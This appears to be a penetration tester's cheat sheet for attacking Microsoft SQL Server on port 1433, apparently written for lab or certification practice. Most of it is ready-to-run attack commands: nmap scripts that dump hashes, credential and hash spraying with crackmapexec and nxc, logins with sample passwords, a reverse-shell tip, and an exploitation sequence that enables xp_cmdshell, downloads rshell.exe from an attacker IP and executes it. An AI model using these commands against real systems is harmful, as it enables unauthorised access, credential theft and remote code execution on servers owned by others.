# MSSQL Port 1433

##### Enumeration

````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
````

##### Impacket

````
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
````

##### Invoke-RunAs

If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.

##### Crackmapexec

````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
````

##### NetExec

Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"

````
nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success
nxc mssql $IP -u users.txt -H $HASH --continue-on-success
````

##### Logging in

````
sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
````

##### Expliotation

````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Users\Public\reverse.exe"'
go
````

##### Notes

If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website